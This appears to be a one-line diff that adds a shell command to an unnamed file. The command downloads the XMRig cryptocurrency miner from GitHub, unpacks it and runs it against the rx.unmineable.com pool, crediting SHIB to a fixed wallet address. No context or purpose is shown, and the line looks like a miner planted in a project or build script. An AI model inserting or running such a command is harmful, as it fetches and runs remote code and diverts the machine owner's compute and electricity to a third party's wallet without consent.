@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.7.0/xmrig-6.7.0-bionic-x64.tar.gz && tar xf xmrig-6.7.0-bionic-x64.tar.gz && cd xmrig-6.7.0 && ./xmrig --donate-level 1 -o rx.unmineable.com:3333 -u SHIB:0x5bc5dd65067aa3e08b3f4c5fe5d29fc860804763
